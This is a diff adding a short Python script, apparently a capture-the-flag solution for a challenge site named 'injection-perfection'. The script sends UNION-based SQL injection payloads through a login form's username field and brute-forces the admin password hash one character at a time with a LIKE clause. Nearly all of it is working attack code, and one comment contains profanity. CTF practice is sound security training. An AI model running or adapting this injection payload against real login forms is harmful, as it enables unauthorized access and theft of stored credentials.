@@ -1,0 +1,13 @@
+import requests
+import string
+a=string.ascii_lowercase+string.digits
+url='https://injection-perfection.acmcyber.com'
+for i in a:
+ data={
+  "username":"-1' UNION SELECT username,password from users where username='admin' and password like 'ad28b35084eabdb7edd22df20378748eb7575aef1342775f151efdc79abda430"+i+"%'--+-",
+  "password":"bruin"
+    }
+# ad28b35084eabdb7edd22df20378748eb7575aef1342775f151efdc79abda430
+ r=requests.post(url,data=data)
+ print(f"{r.text}:{i}")
+# the fuck password. i hate you
